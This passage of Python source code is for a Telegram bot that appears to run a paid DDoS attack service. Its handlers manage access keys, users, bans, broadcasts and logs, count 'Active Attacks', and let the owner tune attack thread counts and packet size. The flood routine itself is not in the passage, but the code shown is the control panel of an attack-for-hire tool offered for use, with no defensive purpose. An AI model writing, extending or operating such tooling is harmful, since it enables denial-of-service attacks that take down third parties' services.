        bot.reply_to(message, f"❌ Key Not Found\nKey {key} does not exist.", parse_mode='MarkdownV2')
        return
    if not data['keys'][key]['active']:
        bot.reply_to(message, f"⚠️ Already Blocked\nKey {key} is already inactive.", parse_mode='MarkdownV2')
        return
    
    data['keys'][key]['active'] = False
    add_log(user_id, f"Blocked key {key}")
    save_data()
    
    block_msg = (
        "🚫 Key Blocked 🚫\n"
        "-----------------------------------\n"
        f"🔑 Key: {key}\n"
        "✅ Status: Successfully blocked\n"
        "-----------------------------------\n"
        "📲 Powered by @Rohan2349"
    )
    bot.reply_to(message, block_msg, parse_mode='MarkdownV2')

# /remove
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Permission Denied\nAdmin only.", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "📋 Usage\n`/remove [USER_ID]`\nEx: `/remove 123456789`", parse_mode='MarkdownV2')
        return
    
    target_user_id = args[1]
    if target_user_id not in data['users']:
        bot.reply_to(message, f"❌ User Not Found\nID {target_user_id} is not registered.", parse_mode='MarkdownV2')
        return
    if target_user_id == OWNER_ID:
        bot.reply_to(message, "⚠️ Cannot Remove\nThe owner cannot be removed.", parse_mode='MarkdownV2')
        return
    
    del data['users'][target_user_id]
    if target_user_id in data['banned']:
        data['banned'].remove(target_user_id)
    add_log(user_id, f"Removed user {target_user_id}")
    save_data()
    
    remove_msg = (
        "➖ User Removed ➖\n"
        "-----------------------------------\n"
        f"🆔 User ID: {target_user_id}\n"
        "✅ Status: Successfully removed\n"
        "-----------------------------------\n"
        "📲 Powered by @Rohan2349"
    )
    bot.reply_to(message, remove_msg, parse_mode='MarkdownV2')

# /broadcast
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Permission Denied\nAdmin only.", parse_mode='MarkdownV2')
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "📋 Usage\n`/broadcast [MESSAGE]`\nEx: `/broadcast Hello everyone!`", parse_mode='MarkdownV2')
        return
    
    broadcast_text = args[1]
    success_count = 0
    fail_count = 0
    
    for target_user_id in data['users'].keys():
        try:
            broadcast_msg = (
                "📢 Broadcast Message 📢\n"
                "-----------------------------------\n"
                f"✉️ Message: {broadcast_text}\n"
                "-----------------------------------\n"
                "📲 From @Rohan2349"
            )
            bot.send_message(target_user_id, broadcast_msg, parse_mode='MarkdownV2')
            success_count += 1
        except Exception as e:
            fail_count += 1
            print(f"Failed to send broadcast to {target_user_id}: {e}")
    
    broadcast_result_msg = (
        "📢 Broadcast Complete 📢\n"
        "-----------------------------------\n"
        f"✅ Sent to: {success_count} users\n"
        f"❌ Failed: {fail_count} users\n"
        "-----------------------------------\n"
        "📲 Powered by @Rohan2349"
    )
    bot.reply_to(message, broadcast_result_msg, parse_mode='MarkdownV2')
    add_log(user_id, f"Broadcasted message to {success_count} users")

# /botupdate
@bot.message_handler(commands=['botupdate'])
def bot_update(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Permission Denied\nAdmin only.", parse_mode='MarkdownV2')
        return
    
    current_time = time.time()
    removed_users = 0
    removed_keys = 0
    
    users_to_remove = [uid for uid, user in data['users'].items() if user['expires'] != 0 and user['expires'] < current_time]
    for uid in users_to_remove:
        del data['users'][uid]
        if uid in data['banned']:
            data['banned'].remove(uid)
        removed_users += 1
    
    keys_to_remove = [key for key, key_data in data['keys'].items() if (key_data['uses'] <= 0 or 
                      (key_data['duration'] != 0 and 'created' in key_data and key_data['created'] + key_data['duration'] < current_time))]
    for key in keys_to_remove:
        del data['keys'][key]
        removed_keys += 1
    
    for key, key_data in data['keys'].items():
        if 'created' not in key_data:
            key_data['created'] = current_time
    
    save_data()
    
    total_users = len(data['users'])
    total_keys = len(data['keys'])
    active_attacks = len(attacks)
    
    update_msg = (
        "🔄 Bot Update Report 🔄\n"
        "-----------------------------------\n"
        f"👥 Total Users: {total_users}\n"
        f"🔑 Total Keys: {total_keys}\n"
        f"💥 Active Attacks: {active_attacks}\n"
        f"🗑️ Removed Users: {removed_users}\n"
        f"🗑️ Removed Keys: {removed_keys}\n"
        "-----------------------------------\n"
        "✅ Status: Data optimized and saved\n"
        "📲 Powered by @Rohan2349"
    )
    bot.reply_to(message, update_msg, parse_mode='MarkdownV2')
    add_log(user_id, "Performed bot update")

# /terminal (Owner only)
@bot.message_handler(commands=['terminal'])
def terminal_command(message):
    user_id = str(message.from_user.id)
    if user_id != OWNER_ID:
        bot.reply_to(message, "🔒 Permission Denied\nOwner only.", parse_mode='MarkdownV2')
        return
    
    args = message.text.split(maxsplit=2)
    if len(args) < 2:
        bot.reply_to(message, "📋 Usage\n`/terminal [SUBCOMMAND] [ARGS]`\nEx: `/terminal set thread 1500`\nSubcommands: `ls`, `cd`, `set thread`, `set packet size`", parse_mode='MarkdownV2')
        return
    
    subcommand = args[1].lower()
    
    if subcommand == 'ls':
        if len(args) < 3:
            bot.reply_to(message, "📋 Usage\n`/terminal ls [users|keys|attacks]`", parse_mode='MarkdownV2')
            return
        target = args[2].lower()
        if target == 'users':
            if not data['users']:
                bot.reply_to(message, "👥 Users\nNo users found.", parse_mode='MarkdownV2')
                return
            ls_msg = "👥 Users List 👥\n-----------------------------------\n" + "\n".join([f"{uid}: {user['type']}" for uid, user in data['users'].items()])
        elif target == 'keys':
            if not data['keys']:
                bot.reply_to(message, "🔑 Keys\nNo keys found.", parse_mode='MarkdownV2')
                return
            ls_msg = "🔑 Keys List 🔑\n-----------------------------------\n" + "\n".join([f"{key}: {kdata['uses']} uses" for key, kdata in data['keys'].items()])
        elif target == 'attacks':
            if not attacks:
                bot.reply_to(message, "💥 Attacks\nNo active attacks.", parse_mode='MarkdownV2')
                return
            ls_msg = "💥 Active Attacks 💥\n-----------------------------------\n" + "\n".join([f"{uid}" for uid in attacks.keys()])
        else:
            bot.reply_to(message, "❌ Invalid Target\nUse: `users`, `keys`, `attacks`", parse_mode='MarkdownV2')
            return
        ls_msg += "\n-----------------------------------\n📲 Powered by @Rohan2349"
        bot.reply_to(message, ls_msg, parse_mode='MarkdownV2')
    
    elif subcommand == 'cd':
        bot.reply_to(message, "⚠️ Not Applicable\nUse `ls` to list data.", parse_mode='MarkdownV2')
    
    elif subcommand == 'set':
        if len(args) < 3:
            bot.reply_to(message, "📋 Usage\n`/terminal set [thread|packet size] [VALUE]`", parse_mode='MarkdownV2')
            return
        setting = args[2].split(maxsplit=1)
        if len(setting) < 2:
            bot.reply_to(message, "❌ Missing Value\nSpecify a value for the setting.", parse_mode='MarkdownV2')
            return
        key, value = setting[0].lower(), setting[1]
        
        try:
            value = int(value)
            if value <= 0:
                bot.reply_to(message, "❌ Invalid Value\nMust be positive.", parse_mode='MarkdownV2')
                return
            
            if key == 'thread':
                BOT_CONFIG['attack_threads'] = value
                set_msg = (
                    "⚙️ Setting Updated ⚙️\n"
                    "-----------------------------------\n"
                    f"⚡ Threads: {value}\n"
                    "-----------------------------------\n"
                    "📲 Powered by @Rohan2349"
                )
            elif key == 'packet size':
                BOT_CONFIG['packet_size'] = value
                set_msg = (
                    "⚙️ Setting Updated ⚙️\n"
                    "-----------------------------------\n"
                    f"📦 Packet Size: {value} bytes\n"
                    "-----------------------------------\n"
                    "📲 Powered by @Rohan2349"
                )
            else:
                bot.reply_to(message, "❌ Invalid Setting\nUse: `thread`, `packet size`", parse_mode='MarkdownV2')
                return
            add_log(user_id, f"Set {key} to {value}")
            bot.reply_to(message, set_msg, parse_mode='MarkdownV2')
        except ValueError:
            bot.reply_to(message, "❌ Invalid Input\nValue must be a positive integer.", parse_mode='MarkdownV2')
    
    else:
        bot.reply_to(message, "❌ Unknown Subcommand\nUse: `ls`, `cd`, `set thread`, `set packet size`", parse_mode='MarkdownV2')

# /tutorial
@bot.message_handler(commands=['tutorial'])
def send_tutorial(message):
    user_id = str(message.from_user.id)
    if user_id in data['banned']:
        bot.reply_to(message, "🚫 Access Denied\nYou are banned.", parse_mode='MarkdownV2')
        return
    if user_id not in data['users']:
        bot.reply_to(message, "⚠️ Register First\nUse /start to join the bot.", parse_mode='MarkdownV2')
        return
    
    if not data['tutorials']:
        bot.reply_to(message, "🎥 Tutorial Videos 🎥\nNo tutorials available yet\\. Check back later!", parse_mode='MarkdownV2')
        return
    
    tutorial_msg = (
        "🎥 Tutorial Videos 🎥\n"
        "-----------------------------------\n"
        "📚 Learn to use the bot or explore DDoS concepts:\n"
    )
    for i, link in enumerate(data['tutorials'], 1):
        # Escape special characters in URLs for MarkdownV2
        escaped_link = link.replace('.', '\\.').replace('-', '\\-').replace('?', '\\?').replace('=', '\\=')
        tutorial_msg += f"{i}\\. {escaped_link}\n"
    tutorial_msg += "-----------------------------------\n📲 Powered by @Rohan2349"
    bot.reply_to(message, tutorial_msg, parse_mode='MarkdownV2')

# /addtutorial [VIDEO_LINK]
@bot.message_handler(commands=['addtutorial'])
def add_tutorial(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Permission Denied\nAdmin only.", parse_mode='MarkdownV2')
        return
    
    if message.chat.type not in ['group', 'supergroup']:
        bot.reply_to(message, "⚠️ Group Only\nThis command must be used in a group.", parse_mode='MarkdownV2')
        return
    
    args = message.text.split(maxsplit=1)
    video_link = None
    
    if len(args) > 1:
        video_link = args[1].strip()
        if not (video_link.startswith('http://') or video_link.startswith('https://')):
            bot.reply_to(message, "❌ Invalid Link\nMust start with `http://` or `https://`", parse_mode='MarkdownV2')
            return
    
    else:
        if message.reply_to_message:
            replied = message.reply_to_message
            if replied.text and (replied.text.startswith('http://') or replied.text.startswith('https://')):
                video_link = replied.text.strip()
            elif replied.entities:
                for entity in replied.entities:
                    if entity.type == 'url':
                        start = entity.offset
                        end = start + entity.length
                        video_link = replied.text[start:end].strip()
                        break
        if not video_link:
            bot.reply_to(message, "📋 Usage\n`/addtutorial [VIDEO_LINK]`\nEx: `/addtutorial https://youtu\\.be/3pZ\\-PCOxAXs\\?si=_E9HPyP7mARHusGV`\nOr reply to a video link in the group.", parse_mode='MarkdownV2')
            return
    
    if video_link not in data['tutorials']:
        data['tutorials'].append(video_link)
        add_log(user_id, f"Added tutorial video: {video_link}")
        save_data()
        
        addtutorial_msg = (
            "🎬 Tutorial Added 🎬\n"
            "-----------------------------------\n"
            "✅ Status: Successfully added\n"
            "📺 Preview: Check below!\n"
            "-----------------------------------\n"
            "📲 Powered by @Rohan2349"
        )
        bot.reply_to(message, addtutorial_msg, parse_mode='MarkdownV2')
        
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
            response = requests.get(video_link, headers=headers, timeout=5)
            response.raise_for_status()
            content_type = response.headers.get('content-type', '').lower()
            
            if 'video' in content_type or video_link.endswith(('.mp4', '.avi', '.mov')):
                bot.send_video(message.chat.id, video_link, caption="🎥 Tutorial Video Preview")
            else:
                # Escape URL for MarkdownV2 when sending as a message
                escaped_link = video_link.replace('.', '\\.').replace('-', '\\-').replace('?', '\\?').replace('=', '\\=')
                bot.send_message(message.chat.id, escaped_link, parse_mode='MarkdownV2')
        except requests.RequestException as e:
            print(f"Failed to fetch video preview: {e}")
            escaped_link = video_link.replace('.', '\\.').replace('-', '\\-').replace('?', '\\?').replace('=', '\\=')
            bot.send_message(message.chat.id, escaped_link, parse_mode='MarkdownV2')
    else:
        bot.reply_to(message, "⚠️ Duplicate\nThis video is already in the tutorial list.", parse_mode='MarkdownV2')

# /logs
@bot.message_handler(commands=['logs'])
def show_logs(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Permission Denied\nAdmin only.", parse_mode='MarkdownV2')
        return
    
    if not data['logs']:
        bot.reply_to(message, "📜 Activity Logs 📜\nNo logs available yet.", parse_mode='MarkdownV2')
        return
    
    logs_msg = (
        "📜 Bot Activity Logs 📜\n"
        "-----------------------------------\n"
        "\n".join(data['logs']) + "\n"
        "-----------------------------------\n"
        "📲 Use `/clearlogs` to reset | Powered by @Rohan2349"
    )
    bot.reply_to(message, logs_msg, parse_mode='MarkdownV2')

# /clearlogs
@bot.message_handler(commands=['clearlogs'])
def clear_logs(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id):
        bot.reply_to(message, "🔒 Permission Denied\nAdmin only.", parse_mode='MarkdownV2')
        return
    
    data['logs'] = []
    add_log(user_id, "Cleared all logs")
    save_data()
    
    clearlogs_msg = (
        "🗑️ Logs Cleared 🗑️\n"
        "-----------------------------------\n"
        "✅ Status: All logs reset\n"
        "-----------------------------------\n"
        "📲 Powered by @Rohan2349"
    )
    bot.reply_to(message, clearlogs_msg, parse_mode='MarkdownV2')

# Run the bot with retry logic
if __name__ == "__main__":
    while True:
        try:
            bot.polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)